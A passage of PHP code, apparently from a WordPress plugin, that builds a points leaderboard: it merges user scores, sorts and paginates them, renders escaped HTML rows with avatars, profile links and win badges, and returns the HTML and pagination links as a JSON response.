            $points_map[$user_id]['participant'] = $value;
        }
    }

    // Step 3: Combine and filter
    $leaderboard = [];
    foreach ($points_map as $data) {
        $combined = $data['total'] + $data['participant'];
        if ($combined > 0) {
            $data['points'] = $combined;
            $leaderboard[] = $data;
        }
    }

    // Debug: Log leaderboard size
    error_log('Leaderboard size: ' . count($leaderboard));

    // Step 4: Sort by points DESC, display_name ASC
    usort($leaderboard, function ($a, $b) {
        if ($a['points'] !== $b['points']) {
            return $b['points'] <=> $a['points']; // Points DESC
        }
        return strcmp($a['display_name'], $b['display_name']); // Name ASC
    });

    // Step 5: Paginate
    $total_items = count($leaderboard);
    $total_pages = ceil($total_items / $per_page);
    $paged_users = array_slice($leaderboard, $offset, $per_page);

    // Debug: Log pagination details
    error_log('Total items: ' . $total_items . ', Total pages: ' . $total_pages . ', Paged users: ' . count($paged_users));

    // Step 6: Render HTML
    ob_start();
    if (!empty($paged_users)) {
        foreach ($paged_users as $index => $user) {
            $rank = $offset + $index + 1;
            $user_id = $user['user_id'];
            $user_data = get_userdata($user_id);
            $user_name = $user_data ? $user_data->display_name : 'Unknown';
            $avatar = get_avatar_url($user_id, ['size' => 50]);
            $profile_url = 'https://datadna.onyxdata.co.uk/profile/?uwp_profile=' . urlencode(basename(uwp_build_profile_tab_url($user_id)));
            $badges = get_user_meta($user_id, 'datadna_user_badges', true) ?: [];
            $wins = array_count_values(array_values($badges))['Winner'] ?? 0;
            ?>
            <div class="player">
                <div class="rank <?php echo $rank <= 3 && $page === 1 ? 'rank-' . $rank : ''; ?>">
                    <?php echo $rank == 1 && $page === 1 ? '🥇' : ($rank == 2 && $page === 1 ? '🥈' : ($rank == 3 && $page === 1 ? '🥉' : $rank)); ?>
                </div>
                <a href="<?php echo esc_url($profile_url); ?>" class="player-info" target="_blank" rel="noopener">
                    <div class="avatar" style="background-image: url(<?php echo esc_url($avatar); ?>);"></div>
                    <div class="name"><?php echo esc_html($user_name); ?></div>
                </a>
                <div class="points"><?php echo number_format($user['points']); ?></div>
                <div class="wins"><?php echo esc_html($wins); ?></div>
            </div>
            <?php
        }
    } else {
        echo '<p>No users to display.</p>';
    }
    $html = ob_get_clean();

    // Step 7: Pagination HTML
    ob_start();
    if ($total_pages > 1) {
        echo '<li class="page-item' . ($page <= 1 ? ' disabled' : '') . '"><a href="#" class="page-link" data-page="' . max(1, $page - 1) . '">« Prev</a></li>';
        for ($i = 1; $i <= $total_pages; $i++) {
            $active = $i === $page ? ' active' : '';
            echo '<li class="page-item' . $active . '"><a href="#" class="page-link" data-page="' . $i . '">' . $i . '</a></li>';
        }
        echo '<li class="page-item' . ($page >= $total_pages ? ' disabled' : '') . '"><a href="#" class="page-link" data-page="' . ($page + 1) . '">Next »</a></li>';
    } else {
        echo '<li class="page-item"><span class="page-link">No more pages</span></li>';
    }
    $pagination = ob_get_clean();

    // Debug: Log pagination HTML
    error_log('Pagination HTML: ' . $pagination);

    // Step 8: Send response
    wp_send_json_success([
        'html' => $html,
        'pagination' => $pagination
    ]);
}





